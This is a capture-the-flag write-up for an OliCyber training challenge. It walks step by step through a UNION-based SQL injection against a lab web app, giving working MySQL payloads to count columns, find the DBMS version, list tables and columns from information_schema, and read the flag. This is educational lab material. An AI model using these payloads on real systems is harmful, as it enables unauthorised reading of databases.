# URL
https://training.olicyber.it/challenges#challenge-357
# Concept
* UNION-based SQL injections
# Method of solve
* we are directed to access this web app: `http://web-17.challs.olicyber.it/union`
* on these webpages we are taught about UNION-based SQL injections
* to solve this challenge, we need to supply valid UNION-based SQL statements to get additional info from the database
  * step 1: identify the number of columns returned by the original SQL statement
    * if we supply the number 1 as the user input, we see this:
    * `1, dummy value1, 3, another_value1, lollo, 4`
    * this indicates that there are 6 columns retrieved by the query
  * step 2: determine which DBMS is being used by the app
    * we supply this payload to test if the app is using `MySQL`-like syntax
    * `1' union select null, version(), null, null, null, null -- - `
    * the result lets us know that the app is using MySQL-like syntax
  * step 3: retrieve the table names in the database
    * now that we know that we're using MySQL-like syntax, we use this payload to get the table names:
    * `1' union select null, table_name, null, null, null, null FROM information_schema.tables WHERE table_schema = database() -- - `
    * the resulting output lets us know that there's two tables, `dummy_data` and `real_data`
  * step 4: getting the column names from the `real_data` table
    * we can use this MySQL-friendly payload to get the column names from the `real_data` table
    * `1' union select null, column_name, null, null, null, null FROM information_schema.columns WHERE table_name = 'real_data' AND table_schema = DATABASE() -- - `
    * this lets us know that there are two columns, `id` and `flag`
  * step 5: getting the contents of the `flag` column in the `real_data` table
    * this payload will get the contents of the `flag` column:
    * `1' union select null, flag, null, null, null, null FROM real_data -- - `









